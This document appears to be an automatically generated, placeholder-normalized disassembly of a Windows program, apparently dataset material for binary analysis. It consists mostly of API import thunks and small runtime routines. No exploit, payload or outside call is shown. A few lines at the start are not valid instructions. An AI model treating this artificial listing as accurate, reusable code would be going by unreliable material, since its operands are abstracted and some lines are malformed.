inc [ edx ]
add [ ebx + 0x4483ccc0 ] cl
and al 0x4
clc
jmp sub_409d60
sub_401c63
add [ esp + 0x4 ] 0xfffffff8
jmp sub_409d88
sub_401c6d
add [ esp + 0x4 ] 0xfffffff8
jmp sub_409d9c
sub_401d27
inc eax
add [ edx ] cl
cli
[ ecx + 0x4b00401d ]
sub_4023f8
mov edx 0x1
xchg edx eax
[ edx ] eax
inc eax
retn
sub_402404
mov edx 0xffffffff
xchg edx eax
[ edx ] eax
dec eax
retn
sub_402410
jmp [ rw-data ]
sub_402418
jmp [ rw-data ]
sub_402420
jmp [ rw-data ]
sub_402438
jmp [ rw-data ]
GetFileType
jmp [ GetFileType@IAT ]
GetFileSize
jmp [ GetFileSize@IAT ]
sub_402460
jmp [ rw-data ]
sub_402470
jmp [ rw-data ]
sub_402490
jmp [ rw-data ]
sub_402498
jmp [ rw-data ]
sub_4024a0
jmp [ rw-data ]
sub_4024a8
jmp [ rw-data ]
ExitThread
jmp [ ExitThread@IAT ]
ExitProcess
jmp [ ExitProcess@IAT ]
MessageBoxA
jmp [ MessageBoxA@IAT ]
sub_4024c8
jmp [ rw-data ]
sub_4024d0
jmp [ rw-data ]
sub_4024d8
jmp [ rw-data ]
GetCommandLineW
jmp [ GetCommandLineW@IAT ]
GetUserDefaultUILanguage
jmp [ GetUserDefaultUILanguage@IAT ]
sub_402500
jmp [ rw-data ]
GetStartupInfoA
jmp [ GetStartupInfoA@IAT ]
IsValidLocale
jmp [ IsValidLocale@IAT ]
LoadLibraryExW
jmp [ LoadLibraryExW@IAT ]
sub_402538
jmp [ rw-data ]
sub_402558
jmp [ rw-data ]
sub_402578
jmp [ rw-data ]
SysAllocStringLen
jmp [ SysAllocStringLen@IAT ]
SysReAllocStringLen
jmp [ SysReAllocStringLen@IAT ]
sub_402590
jmp [ rw-data ]
sub_402598
jmp [ rw-data ]
sub_4025a0
jmp [ rw-data ]
QueryPerformanceCounter
jmp [ QueryPerformanceCounter@IAT ]
sub_4025b0
jmp [ rw-data ]
GetSystemInfo
jmp [ GetSystemInfo@IAT ]
sub_402754
mov ecx [ eax ]
mov [ edx ] ecx
mov ecx [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
mov [ edx + 0x4 ] ecx
mov [ edx + 0x8 ] eax
retn
sub_402768
mov ecx [ eax ]
mov [ edx ] ecx
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
mov ecx [ eax + 0x8 ]
mov [ edx + 0x8 ] ecx
mov ecx [ eax + 0xc ]
mov eax [ eax + 0x10 ]
mov [ edx + 0xc ] ecx
mov [ edx + 0x10 ] eax
retn
sub_4027b4
fild [ eax ]
fild [ eax + 0x8 ]
fild [ eax + 0x10 ]
fild [ eax + 0x18 ]
mov ecx [ eax + 0x20 ]
mov [ edx + 0x20 ] ecx
fistp [ edx + 0x18 ]
fistp [ edx + 0x10 ]
fistp [ edx + 0x8 ]
fistp [ edx ]
retn
sub_4029e2
retn
sub_4042a8
call sub_40a7e8
cmp [ eax ] 0x0
je r-xdata
xor eax eax
retn
call sub_40a7e8
mov eax [ eax ]
mov eax [ eax + 0x4 ]
retn
sub_4042fc
call sub_40a7e8
mov eax [ eax ]
retn
sub_404308
mov [ rw-data ] edx
call sub_4067d4
sub_404388
retn
sub_40439c
call sub_4024e8
call sub_40438c
retn
sub_4043a8
push ebx
call sub_40a7e8
mov ebx [ eax + 0x4 ]
call sub_40a7e8
xor edx edx
mov [ eax + 0x4 ] edx
mov eax ebx
pop ebx
retn
sub_40460c
mov [ rw-data ] ax
fnclex
fldcw [ rw-data ]
retn
sub_40461c
push 0x0
fnstcw [ esp ]
pop eax
retn
sub_404700
push ebx
mov ebx eax
push ebx
call sub_402410
dec eax
sete al
pop ebx
retn
sub_4048dc
retn
sub_40498c
mov edx [ eax + 0x1c ]
call sub_404944
retn
sub_404998
jmp [ rw-data ]
sub_4049a0
jmp [ rw-data ]
sub_404a38
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
push 0xd7b1
push sub_404998
push 0x64
call sub_4049a8
pop ebx
pop ebp
retn 0x4
sub_404a58
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
push 0xd7b2
push sub_4049a0
push 0x65
call sub_4049a8
pop ebx
pop ebp
retn 0x4
sub_404db8
movzx ecx [ rw-data ]
and cl 0x3
cmp cl 0x2
jbe r-xdata
movzx ecx cl
call sub_404cd8
retn
mov cl 0x2
sub_404dd4
mov ecx 0x3
call sub_404cd8
retn
sub_404f3a
retn
sub_4051b4
retn
j_sub_4051c0
jmp sub_4051c0
sub_4051bd
retn
sub_4054a4
fninit
fwait
fldcw [ rw-data ]
retn
sub_4054b8
mov al 0x5
jmp sub_404360
sub_40556d
jmp sub_405fd0
sub_405574
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_40557c
mov eax [ eax - 0x30 ]
test eax eax
je r-xdata
retn
mov eax [ eax ]
sub_405588
push ebx
mov ebx eax
mov eax ebx
call sub_4055b8
call sub_404204
mov edx eax
mov eax ebx
call sub_4055fc
pop ebx
retn
sub_4055a4
push ebx
mov ebx eax
mov eax ebx
call sub_405654
mov eax ebx
call sub_404220
pop ebx
retn
sub_4055b8
add eax 0xffffffcc
mov eax [ eax ]
retn
sub_4055e0
call sub_405bb4
test dl dl
jle r-xdata
retn
call sub_405b5c
sub_4056a8
retn
sub_4056ac
cmp eax edx
sete al
retn
sub_4056b4
retn
sub_405778
jmp sub_405fd0
sub_40577f
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4057cc
add eax 0xffffffac
mov eax [ eax ]
retn
sub_4058a8
add eax 0xffffffb8
mov eax [ eax ]
retn
sub_4058b0
mov eax 0x8000ffff
retn
sub_4058b8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx ]
call sub_4054c8
pop esi
pop ebx
retn
sub_4058cc
retn
sub_4058d0
retn
sub_4058d4
retn
sub_405a6e
retn
sub_405b35
jmp sub_405d1c
sub_405b3a
mov eax [ esp + 0x2c ]
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
call sub_406120
retn
mov ecx [ eax ]
mov dl 0x81
push eax
call [ ecx - 0x4 ]
pop eax
call sub_405b5c
sub_405b5c
mov edx [ eax ]
call [ edx - 0x8 ]
retn
sub_405b93
jmp sub_405d1c
sub_405bb4
test dl dl
jg r-xdata
push eax
push edx
mov edx [ eax ]
call [ edx - 0x18 ]
pop edx
pop eax
retn
retn
sub_405bc4
call sub_405c08
mov edx [ eax ]
test edx edx
je r-xdata
retn
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_405bdc
sub_405c08
mov edx [ eax ]
add edx 0xffffffcc
mov edx [ edx ]
add edx eax
sub edx 0x4
mov eax edx
retn
sub_405c18
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push 0x0
push 0x0
push 0x0
push 0xeedfadf
call [ rw-data ]
sub_405ce0
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push edx
push esp
push 0x1
push 0x0
push 0xeedfae2
call [ rw-data ]
pop edx
sub_405cfc
push eax
push edx
cmp [ rw-data ] 0x1
jbe r-xdata
pop edx
pop eax
retn
push esp
push 0x2
push 0x0
push 0xeedfae3
call [ rw-data ]
sub_406055
call sub_40a7e8
mov ecx [ eax ]
mov edx [ ecx ]
mov [ eax ] edx
mov eax [ ecx + 0x8 ]
jmp sub_4055f0
sub_40611c
retn
sub_4061b9
retn
sub_4062fc
push eax
xor edx edx
lea eax [ ebp - 0x10 ]
mov ecx [ fs : edx ]
mov [ fs : edx ] eax
mov [ eax ] ecx
mov [ eax + 0x4 ] r-xdata
mov [ eax + 0x8 ] ebp
pop ecx
mov [ ecx + 0x4 ] eax
retn
sub_406392
jmp sub_405d1c
sub_4063fe
jmp sub_405d1c
sub_4064a8
jmp sub_405fd0
sub_4064af
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4064f7
jmp sub_405fd0
sub_4064fe
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_406504
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_40a204
pop esi
pop ebx
retn
sub_406636
retn
sub_4067cd
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4067d4
mov [ rw-data ] eax
call sub_4066c8
sub_406884
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
push ebx
call ExitThread
mov eax ebx
call [ rw-data ]
sub_406a00
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx [ rw-data ]
push ebx
call sub_4069d4
pop ebx
pop ebp
retn 0x4
sub_406a38
mov edx [ eax ]
movzx ecx [ rw-data ]
call sub_4072d4
retn
sub_406a48
mov edx [ eax ]
call sub_4072ac
retn
sub_406b44
retn
sub_406b84
retn
sub_406b88
xchg [ esp ] ecx
push ecx
xor ecx ecx
mov cl [ edx ]
inc edx
jmp sub_40699c
sub_406b96
retn
sub_406bac
retn
sub_406bfc
test eax eax
je r-xdata
retn
mov edx [ eax - 0x8 ]
inc edx
jle r-xdata
[ eax - 0x8 ]
sub_406c0c
test eax eax
je r-xdata
mov eax r-xdata
retn
retn
j_sub_406c24#2
jmp sub_406c24
sub_406c81
retn
j_sub_406c24
jmp sub_406c24
sub_406c89
retn
sub_406d2c
test eax eax
je r-xdata
retn
push eax
push 0x0
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_404360
sub_406d44
xchg [ eax ] edx
test edx edx
je r-xdata
retn
push edx
call sub_402590
sub_406e54
push ebx
mov ebx [ rw-data ]
push ebx
call sub_406db8
pop ebx
retn
sub_406eb4
retn
sub_406ef0
retn
sub_406f1f
retn
sub_406f20
test eax eax
je r-xdata
mov eax r-xdata
retn
retn
sub_406fed
retn
sub_407095
retn
sub_40709d
retn
sub_4070a5
retn
sub_4071d4
push ebx
mov ebx [ rw-data ]
push ebx
call sub_407140
pop ebx
retn
sub_407250
retn
sub_40728c
retn
sub_4072a8
retn
sub_4072d3
retn
sub_4072f6
retn
sub_407308
retn
sub_407332
retn
sub_4073e6
jmp sub_405fd0
sub_4073ed
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4073f4
xor ecx ecx
mov cl [ edx ]
inc edx
jmp sub_4071d4
sub_4073fe
retn
sub_407764
retn
sub_407891
jmp sub_405fd0
sub_407898
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_407a32
jmp sub_405fd0
sub_407a39
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_407a40
jmp sub_407a40
sub_407a99
retn
sub_407d0a
jmp sub_405fd0
sub_407d11
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_407de4
mov ecx 0x1
jmp sub_407d4c
sub_407dee
retn
sub_407e28
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_404360
call [ rw-data ]
retn
sub_407f50
mov ecx 0x1
jmp sub_407e40
sub_407f5a
retn
sub_407f5c
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_404360
call [ rw-data ]
retn
sub_4081c8
retn
sub_4081cc
push edx
call sub_404204
pop edx
test eax eax
je r-xdata
retn
push eax
call sub_407de4
pop eax
sub_4081e0
push eax
call sub_407f50
pop eax
call sub_404220
retn
sub_4081f0
push ebx
movzx ebx [ rw-data ]
push ebx
xchg ecx eax
xchg edx ecx
call sub_406a90
pop ebx
retn
sub_408204
push ecx
mov [ esp ] eax
mov ecx [ esp ]
test ecx ecx
je r-xdata
xchg ecx edx
call sub_4081f0
pop edx
retn
sub ecx 0x4
mov ecx [ ecx ]
shr ecx 0x1
sub_408290
jmp sub_405fd0
sub_408297
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_4082a0
mov al 0x11
jmp sub_404360
sub_4082cb
retn
sub_40835d
retn
sub_4083da
retn
sub_40873e
jmp sub_405fd0
sub_408745
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_408764
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_4080b4
pop ebp
retn 0x4
j_sub_407e40
jmp sub_407e40
sub_408779
retn
sub_40877c
call sub_408928
retn
sub_40898c
test eax eax
je r-xdata
retn
[ eax - 0x8 ]
sub_4089c0
call sub_408998
retn
sub_408d58
push rw-data
call sub_402438
retn
sub_408df4
jmp sub_405fd0
sub_408dfb
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_408ed7
jmp sub_405fd0
sub_408ede
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40905b
jmp sub_405fd0
sub_409062
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4091d3
jmp sub_405fd0
sub_409272
jmp sub_405fd0
sub_409279
mov esp ebp
pop ebp
retn
sub_409678
jmp sub_405fd0
sub_409695
jmp sub_405fd0
sub_40969c
pop ebx
mov esp ebp
pop ebp
retn
sub_40980a
jmp sub_405fd0
sub_409811
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4098f1
jmp sub_405fd0
sub_4098f8
movzx eax [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_409aff
jmp sub_405fd0
sub_409b06
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_409b10
call sub_409b18
retn
sub_409b44
call sub_409b54
retn
sub_409b4c
call sub_409b74
retn
sub_409b54
push ebx
mov ebx eax
mov eax 0x8
call sub_404204
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
pop ebx
retn
sub_409c13
jmp sub_405d1c
sub_409c34
mov edx [ rw-data ]
mov [ eax ] edx
mov [ rw-data ] eax
retn
sub_409ca8
jmp sub_405fd0
sub_409caf
pop ecx
pop ebp
retn
sub_409d28
test eax eax
je r-xdata
retn
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
sub_409d34
add eax 0x4
call sub_402404
retn
sub_409d40
cmp [ eax + 0x4 ] 0x0
je r-xdata
retn
mov al 0x2
call sub_404360
sub_409d50
call sub_405588
mov [ eax + 0x4 ] 0x1
retn
sub_409d88
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add eax 0x4
call sub_4023f8
pop ebp
retn 0x4
sub_409fe8
jmp sub_405fd0
sub_409fef
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_40a078
jmp sub_405fd0
sub_40a07f
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_40a14f
jmp sub_405fd0
sub_40a156
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_40a1e2
jmp sub_405fd0
sub_40a1e9
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_40a1f0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_40a15c
pop esi
pop ebx
retn
GetACP
jmp [ GetACP@IAT ]
sub_40a278
add esp 0xffffffdc
push esp
call GetSystemInfo
mov eax [ esp + 0x14 ]
add esp 0x24
retn
sub_40a2c8
jmp [ rw-data ]
LocalFree
jmp [ LocalFree@IAT ]
LoadLibraryA
jmp [ LoadLibraryA@IAT ]
lstrcmpiA
jmp [ lstrcmpiA@IAT ]
sub_40a2e8
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
call sub_4043c8
pop ebp
retn
sub_40a2fc
push ebp
mov ebp esp
movzx ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
call sub_404c14
pop ebp
retn
j_sub_40a3fe
jmp [ rw-data ]
sub_40a37a
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
sub eax [ ebp + 0xc ]
test eax eax
jns r-xdata
sar eax 0x2
pop ebp
retn
add eax 0x3
sub_40a38f
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor edx edx
jmp r-xdata
cmp [ eax ] 0x0
jne r-xdata
add eax 0x4
inc edx
mov eax edx
pop ebp
retn
sub_40a3a6
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add eax [ eax + 0x3c ]
pop ebp
retn 0x4
sub_40a3d6
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
pop ebp
retn 0x4
sub_40a3e3
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx + 0x34 ]
jne r-xdata
xor eax eax
mov eax 0x1
jmp r-xdata
pop ebp
retn 0x8
sub_40a6d4
push ebp
mov ebp esp
push rw-data
call sub_402420
pop ebp
retn
sub_40a6e3
push ebp
mov ebp esp
push 0x0
call sub_40a66a
push rw-data
call sub_402438
pop ebp
retn
sub_40a764
jmp sub_405fd0
sub_40a76b
pop ebp
retn
sub_40a770
jmp [ rw-data ]
LocalAlloc
jmp [ LocalAlloc@IAT ]
TlsSetValue
jmp [ TlsSetValue@IAT ]
sub_40a790
push eax
push 0x40
call LocalAlloc
retn
sub_40a79c
mov eax 0x3c
retn
sub_40a828
mov eax rw-data
call sub_409c34
retn
sub_40abac
mov edx [ eax + 0x8 ]
sub edx [ eax ]
mov eax edx
retn
sub_40abb4
mov edx [ eax + 0xc ]
sub edx [ eax + 0x4 ]
mov eax edx
retn
sub_40abc0
push ecx
mov edx eax
and dx 0xffff
mov [ esp ] dx
shr eax 0x10
mov [ esp + 0x2 ] ax
mov eax [ esp ]
pop edx
retn
sub_40ac5c
mov edx [ eax + 0x8 ]
cmp edx [ eax ]
jle r-xdata
mov al 0x1
retn
mov edx [ eax + 0xc ]
cmp edx [ eax + 0x4 ]
jle r-xdata
xor eax eax
retn
RegConnectRegistryW
jmp [ RegConnectRegistryW@IAT ]
RegCreateKeyExW
jmp [ RegCreateKeyExW@IAT ]
RegDeleteKeyW
jmp [ RegDeleteKeyW@IAT ]
RegDeleteValueW
jmp [ RegDeleteValueW@IAT ]
RegEnumKeyExW
jmp [ RegEnumKeyExW@IAT ]
RegEnumValueW
jmp [ RegEnumValueW@IAT ]
RegFlushKey
jmp [ RegFlushKey@IAT ]
RegLoadKeyW
jmp [ RegLoadKeyW@IAT ]
RegQueryInfoKeyW
jmp [ RegQueryInfoKeyW@IAT ]
RegQueryValueExW
jmp [ RegQueryValueExW@IAT ]
RegReplaceKeyW
jmp [ RegReplaceKeyW@IAT ]
RegRestoreKeyW
jmp [ RegRestoreKeyW@IAT ]
RegSaveKeyW
jmp [ RegSaveKeyW@IAT ]
RegSetValueExW
jmp [ RegSetValueExW@IAT ]
RegUnLoadKeyW
jmp [ RegUnLoadKeyW@IAT ]
BeginUpdateResourceW
jmp [ BeginUpdateResourceW@IAT ]
CompareStringW
jmp [ CompareStringW@IAT ]
__imp_CompareStringW
jmp [ CompareStringW@IAT ]
CreateFileW
jmp [ CreateFileW@IAT ]
CreateMutexW
jmp [ CreateMutexW@IAT ]
CreateThread
jmp [ CreateThread@IAT ]
EndUpdateResourceW
jmp [ EndUpdateResourceW@IAT ]
FileTimeToDosDateTime
jmp [ FileTimeToDosDateTime@IAT ]
FileTimeToLocalFileTime
jmp [ FileTimeToLocalFileTime@IAT ]
FindClose
jmp [ FindClose@IAT ]
FindFirstFileW
jmp [ FindFirstFileW@IAT ]
FindNextFileW
jmp [ FindNextFileW@IAT ]
FindResourceW
jmp [ FindResourceW@IAT ]
__imp_FindResourceW
jmp [ FindResourceW@IAT ]
FormatMessageW
jmp [ FormatMessageW@IAT ]
InterlockedCompareExchange
jmp [ InterlockedCompareExchange@IAT ]
FreeResource
jmp [ FreeResource@IAT ]
GetCPInfo
jmp [ GetCPInfo@IAT ]
GetCurrentProcess
jmp [ GetCurrentProcess@IAT ]
GetCurrentProcessId
jmp [ GetCurrentProcessId@IAT ]
GetCurrentThread
jmp [ GetCurrentThread@IAT ]
GetDateFormatW
jmp [ GetDateFormatW@IAT ]
GetDiskFreeSpaceW
jmp [ GetDiskFreeSpaceW@IAT ]
GetDriveTypeW
jmp [ GetDriveTypeW@IAT ]
GetExitCodeThread
jmp [ GetExitCodeThread@IAT ]
GetFileAttributesW
jmp [ GetFileAttributesW@IAT ]
GetLocalTime
jmp [ GetLocalTime@IAT ]
GetLocaleInfoW
jmp [ GetLocaleInfoW@IAT ]
GetLogicalDriveStringsW
jmp [ GetLogicalDriveStringsW@IAT ]
GetModuleHandleW
jmp [ GetModuleHandleW@IAT ]
sub_40bbd3
jmp sub_405fd0
sub_40bbda
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
GetThreadPriority
jmp [ GetThreadPriority@IAT ]
GetVersion
jmp [ GetVersion@IAT ]
GetVersionExW
jmp [ GetVersionExW@IAT ]
GlobalAlloc
jmp [ GlobalAlloc@IAT ]
GlobalFindAtomW
jmp [ GlobalFindAtomW@IAT ]
LoadLibraryW
jmp [ LoadLibraryW@IAT ]
LoadResource
jmp [ LoadResource@IAT ]
LockResource
jmp [ LockResource@IAT ]
MoveFileW
jmp [ MoveFileW@IAT ]
OpenMutexW
jmp [ OpenMutexW@IAT ]
IsDebuggerPresent
jmp [ IsDebuggerPresent@IAT ]
RaiseException
jmp [ RaiseException@IAT ]
ResetEvent
jmp [ ResetEvent@IAT ]
ResumeThread
jmp [ ResumeThread@IAT ]
SetEndOfFile
jmp [ SetEndOfFile@IAT ]
SetEvent
jmp [ SetEvent@IAT ]
SetFileAttributesW
jmp [ SetFileAttributesW@IAT ]
SetThreadLocale
jmp [ SetThreadLocale@IAT ]
SetThreadPriority
jmp [ SetThreadPriority@IAT ]
SignalObjectAndWait
jmp [ SignalObjectAndWait@IAT ]
SizeofResource
jmp [ SizeofResource@IAT ]
SuspendThread
jmp [ SuspendThread@IAT ]
SwitchToThread
jmp [ SwitchToThread@IAT ]
TryEnterCriticalSection
jmp [ TryEnterCriticalSection@IAT ]
UpdateResourceW
jmp [ UpdateResourceW@IAT ]
VirtualAlloc
jmp [ VirtualAlloc@IAT ]
VirtualFree
jmp [ VirtualFree@IAT ]
VirtualQuery
jmp [ VirtualQuery@IAT ]
VirtualQueryEx
jmp [ VirtualQueryEx@IAT ]
WaitForMultipleObjectsEx
jmp [ WaitForMultipleObjectsEx@IAT ]
WaitForSingleObject
jmp [ WaitForSingleObject@IAT ]
lstrcpyW
jmp [ lstrcpyW@IAT ]
GetFileVersionInfoW
jmp [ GetFileVersionInfoW@IAT ]
GetFileVersionInfoSizeW
jmp [ GetFileVersionInfoSizeW@IAT ]
VerQueryValueW
jmp [ VerQueryValueW@IAT ]
AbortDoc
jmp [ AbortDoc@IAT ]
Arc
jmp [ Arc@IAT ]
Chord
jmp [ Chord@IAT ]
CreateBitmap
jmp [ CreateBitmap@IAT ]
CreateBrushIndirect
jmp [ CreateBrushIndirect@IAT ]
CreateDCW
jmp [ CreateDCW@IAT ]
CreateDIBSection
jmp [ CreateDIBSection@IAT ]
CreateDIBitmap
jmp [ CreateDIBitmap@IAT ]
CreateHalftonePalette
jmp [ CreateHalftonePalette@IAT ]
CreateICW
jmp [ CreateICW@IAT ]
CreatePalette
jmp [ CreatePalette@IAT ]
CreatePenIndirect
jmp [ CreatePenIndirect@IAT ]
CreateRectRgn
jmp [ CreateRectRgn@IAT ]
Ellipse
jmp [ Ellipse@IAT ]
EndDoc
jmp [ EndDoc@IAT ]
EndPage
jmp [ EndPage@IAT ]
EnumFontFamiliesExW
jmp [ EnumFontFamiliesExW@IAT ]
EnumFontsW
jmp [ EnumFontsW@IAT ]
ExcludeClipRect
jmp [ ExcludeClipRect@IAT ]
ExtFloodFill
jmp [ ExtFloodFill@IAT ]
ExtTextOutW
jmp [ ExtTextOutW@IAT ]
FrameRgn
jmp [ FrameRgn@IAT ]
GetBrushOrgEx
jmp [ GetBrushOrgEx@IAT ]
GetClipBox
jmp [ GetClipBox@IAT ]
GetCurrentPositionEx
jmp [ GetCurrentPositionEx@IAT ]
GetDCOrgEx
jmp [ GetDCOrgEx@IAT ]
GetDIBColorTable
jmp [ GetDIBColorTable@IAT ]
GetPixel
jmp [ GetPixel@IAT ]
GetRgnBox
jmp [ GetRgnBox@IAT ]
GetTextExtentPoint32W
jmp [ GetTextExtentPoint32W@IAT ]
GetTextMetricsW
jmp [ GetTextMetricsW@IAT ]
GetWindowOrgEx
jmp [ GetWindowOrgEx@IAT ]
LineTo
jmp [ LineTo@IAT ]
MaskBlt
jmp [ MaskBlt@IAT ]
MoveToEx
jmp [ MoveToEx@IAT ]
Pie
jmp [ Pie@IAT ]
PolyBezier
jmp [ PolyBezier@IAT ]
PolyBezierTo
jmp [ PolyBezierTo@IAT ]
Polygon
jmp [ Polygon@IAT ]
Polyline
jmp [ Polyline@IAT ]
RectVisible
jmp [ RectVisible@IAT ]
Rectangle
jmp [ Rectangle@IAT ]
RoundRect
jmp [ RoundRect@IAT ]
SetAbortProc
jmp [ SetAbortProc@IAT ]
SetBrushOrgEx
jmp [ SetBrushOrgEx@IAT ]
SetDIBColorTable
jmp [ SetDIBColorTable@IAT ]
SetDIBits
jmp [ SetDIBits@IAT ]
SetPixel
jmp [ SetPixel@IAT ]
SetROP2
jmp [ SetROP2@IAT ]
SetViewportOrgEx
jmp [ SetViewportOrgEx@IAT ]
StartDocW
jmp [ StartDocW@IAT ]
StartPage
jmp [ StartPage@IAT ]
StretchDIBits
jmp [ StretchDIBits@IAT ]
UnrealizeObject
jmp [ UnrealizeObject@IAT ]
ActivateKeyboardLayout
jmp [ ActivateKeyboardLayout@IAT ]
AdjustWindowRectEx
jmp [ AdjustWindowRectEx@IAT ]
sub_40c034
push rw-data
call j_sub_40a3fe
pop ecx
pop edx
xchg [ esp ] eax
retn
CallNextHookEx
jmp [ CallNextHookEx@IAT ]
CallWindowProcW
jmp [ CallWindowProcW@IAT ]
CharLowerW
jmp [ CharLowerW@IAT ]
CharUpperBuffW
jmp [ CharUpperBuffW@IAT ]
CheckMenuItem
jmp [ CheckMenuItem@IAT ]
ClientToScreen
jmp [ ClientToScreen@IAT ]
CopyIcon
jmp [ CopyIcon@IAT ]
CreateAcceleratorTableW
jmp [ CreateAcceleratorTableW@IAT ]
CreateIcon
jmp [ CreateIcon@IAT ]
CreateMenu
jmp [ CreateMenu@IAT ]
CreatePopupMenu
jmp [ CreatePopupMenu@IAT ]
DefFrameProcW
jmp [ DefFrameProcW@IAT ]
DefMDIChildProcW
jmp [ DefMDIChildProcW@IAT ]
DestroyIcon
jmp [ DestroyIcon@IAT ]
DestroyMenu
jmp [ DestroyMenu@IAT ]
DestroyWindow
jmp [ DestroyWindow@IAT ]
__imp_DispatchMessageW
jmp [ DispatchMessageW@IAT ]
DispatchMessageA
jmp [ DispatchMessageA@IAT ]
DispatchMessageW
jmp [ DispatchMessageW@IAT ]
DrawFocusRect
jmp [ DrawFocusRect@IAT ]
DrawFrameControl
jmp [ DrawFrameControl@IAT ]
DrawIcon
jmp [ DrawIcon@IAT ]
DrawIconEx
jmp [ DrawIconEx@IAT ]
DrawMenuBar
jmp [ DrawMenuBar@IAT ]
DrawTextExW
jmp [ DrawTextExW@IAT ]
EnableScrollBar
jmp [ EnableScrollBar@IAT ]
EnableWindow
jmp [ EnableWindow@IAT ]
EndPaint
jmp [ EndPaint@IAT ]
EnumChildWindows
jmp [ EnumChildWindows@IAT ]
EnumThreadWindows
jmp [ EnumThreadWindows@IAT ]
EnumWindows
jmp [ EnumWindows@IAT ]
FindWindowW
jmp [ FindWindowW@IAT ]
FindWindowExW
jmp [ FindWindowExW@IAT ]
GetClassInfoW
jmp [ GetClassInfoW@IAT ]
GetClassLongW
jmp [ GetClassLongW@IAT ]
GetClientRect
jmp [ GetClientRect@IAT ]
GetCursor
jmp [ GetCursor@IAT ]
GetCursorPos
jmp [ GetCursorPos@IAT ]
GetDC
jmp [ GetDC@IAT ]
GetDCEx
jmp [ GetDCEx@IAT ]
GetForegroundWindow
jmp [ GetForegroundWindow@IAT ]
GetIconInfo
jmp [ GetIconInfo@IAT ]
GetKeyNameTextW
jmp [ GetKeyNameTextW@IAT ]
GetKeyboardLayout
jmp [ GetKeyboardLayout@IAT ]
GetKeyboardLayoutList
jmp [ GetKeyboardLayoutList@IAT ]
GetKeyboardLayoutNameW
jmp [ GetKeyboardLayoutNameW@IAT ]
GetKeyboardState
jmp [ GetKeyboardState@IAT ]
GetLastActivePopup
jmp [ GetLastActivePopup@IAT ]
GetMenu
jmp [ GetMenu@IAT ]
GetMenuItemID
jmp [ GetMenuItemID@IAT ]
GetMenuItemInfoW
jmp [ GetMenuItemInfoW@IAT ]
GetMenuStringW
jmp [ GetMenuStringW@IAT ]
GetMessageExtraInfo
jmp [ GetMessageExtraInfo@IAT ]
GetMessagePos
jmp [ GetMessagePos@IAT ]
__imp_GetWindow
jmp [ GetWindow@IAT ]
GetPropW
jmp [ GetPropW@IAT ]
GetScrollInfo
jmp [ GetScrollInfo@IAT ]
GetScrollPos
jmp [ GetScrollPos@IAT ]
GetScrollRange
jmp [ GetScrollRange@IAT ]
GetSubMenu
jmp [ GetSubMenu@IAT ]
GetSysColor
jmp [ GetSysColor@IAT ]
GetSysColorBrush
jmp [ GetSysColorBrush@IAT ]
GetSystemMenu
jmp [ GetSystemMenu@IAT ]
GetTopWindow
jmp [ GetTopWindow@IAT ]
GetWindow
jmp [ GetWindow@IAT ]
GetWindowDC
jmp [ GetWindowDC@IAT ]
__imp_GetWindowPlacement
jmp [ GetWindowPlacement@IAT ]
GetWindowPlacement
jmp [ GetWindowPlacement@IAT ]
GetWindowRect
